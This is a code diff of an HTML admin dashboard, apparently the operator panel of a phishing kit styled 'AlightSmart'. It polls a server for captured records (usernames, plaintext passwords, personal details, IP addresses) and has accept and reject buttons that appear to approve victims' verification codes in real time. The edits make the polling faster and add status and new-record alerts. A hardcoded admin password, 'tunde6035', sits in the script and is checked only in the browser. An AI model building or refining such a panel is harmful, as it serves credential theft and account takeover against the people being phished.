@@ -3,28 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AlightSmart Admin Dashboard</title>
+    <title>AlightSmart Admin</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f1f5f9; padding: 20px; }
-        .container { max-width: 1300px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f1f5f9; padding: 15px; }
+        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         .header { background: #1e40af; color: white; padding: 20px; text-align: center; }
         table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #eee; }
-        th { background: #e2e8f0; }
+        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #e2e8f0; font-weight: 600; }
         tr:hover { background: #f8fafc; }
-        .btn { padding: 6px 12px; margin: 2px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
+        .btn { padding: 6px 12px; margin: 3px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
         .accept { background: #22c55e; color: white; }
         .reject { background: #ef4444; color: white; }
-        .clear-btn { background: #ef4444; color: white; padding: 10px 20px; border: none; border-radius: 8px; margin: 15px; }
+        .clear-btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; margin: 15px; }
+        .status { text-align: center; padding: 10px; font-size: 0.95rem; color: #64748b; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Password: tunde6035</p>
+            <p>Live Records • Password:</p>
         </div>
+
+        <div class="status" id="status">🔄 Connecting to server...</div>
 
         <table id="recordsTable">
             <thead>
@@ -34,7 +37,7 @@
                     <th>Username</th>
                     <th>Password</th>
                     <th>Full Details</th>
-                    <th>IP Address</th>
+                    <th>IP</th>
                     <th>Action</th>
                 </tr>
             </thead>
@@ -46,13 +49,18 @@
 
     <script>
         const ADMIN_PASSWORD = "tunde6035";
+        let lastRecordCount = 0;
 
         async function loadRecords() {
             try {
-                const res = await fetch('/api/records');
+                const res = await fetch('/api/records', { cache: 'no-store' });
+                if (!res.ok) throw new Error("Server error");
+                
                 const records = await res.json();
                 const tbody = document.querySelector('#recordsTable tbody');
                 tbody.innerHTML = "";
+
+                document.getElementById('status').innerHTML = `✅ Connected • ${records.length} records`;
 
                 records.forEach(r => {
                     let action = '';
@@ -67,50 +75,72 @@
 
                     tbody.innerHTML += `
                         <tr>
-                            <td>${r.timestamp}</td>
-                            <td>${r.type}</td>
+                            <td>${r.timestamp || '-'}</td>
+                            <td>${r.type || 'Login'}</td>
                             <td><strong>${r.username || '-'}</strong></td>
                             <td><code>${r.password || '-'}</code></td>
-                            <td style="max-width:400px; word-break:break-all;">${r.address || '-'}</td>
+                            <td style="max-width:480px; word-break:break-all;">${r.address || '-'}</td>
                             <td>${r.ip || 'Unknown'}</td>
                             <td>${action}</td>
                         </tr>`;
                 });
+
+                // Detect new records
+                if (records.length > lastRecordCount) {
+                    console.log(`🔔 ${records.length - lastRecordCount} new record(s) detected`);
+                }
+                lastRecordCount = records.length;
+
             } catch (e) {
                 console.error(e);
+                document.getElementById('status').innerHTML = `⚠️ Connection issue - Retrying...`;
             }
         }
 
         async function confirmCode(id, status) {
-            if (confirm(`Mark this code as ${status}?`)) {
-                await fetch('/api/confirm-code', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ id, status })
-                });
-                loadRecords();
+            if (confirm(`Mark this as ${status}?`)) {
+                try {
+                    await fetch('/api/confirm-code', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id, status })
+                    });
+                    loadRecords();
+                } catch (e) {}
             }
         }
 
         async function clearRecords() {
-            if (confirm("Delete all records?")) {
+            if (confirm("Delete ALL records permanently?")) {
                 await fetch('/api/clear', { method: 'POST' });
                 loadRecords();
             }
         }
 
-        // Password protection + Auto refresh
+        // Strong Polling with Fallback
         window.onload = () => {
             const pass = prompt("Enter Admin Password:");
-            if (pass === ADMIN_PASSWORD) {
-                loadRecords();
-                setInterval(loadRecords, 3000);   // Refresh every 3 seconds
-            } else {
+            if (pass !== ADMIN_PASSWORD) {
                 alert("❌ Wrong Password");
                 window.location.href = "/";
+                return;
             }
+
+            loadRecords();
+
+            // Primary fast polling
+            setInterval(loadRecords, 1800);
+
+            // Fallback polling (every 5 seconds)
+            setInterval(() => {
+                if (document.visibilityState === 'visible') loadRecords();
+            }, 5000);
+
+            // Extra aggressive refresh when tab is active
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible') loadRecords();
+            });
         };
-        
     </script>
 </body>
 </html>
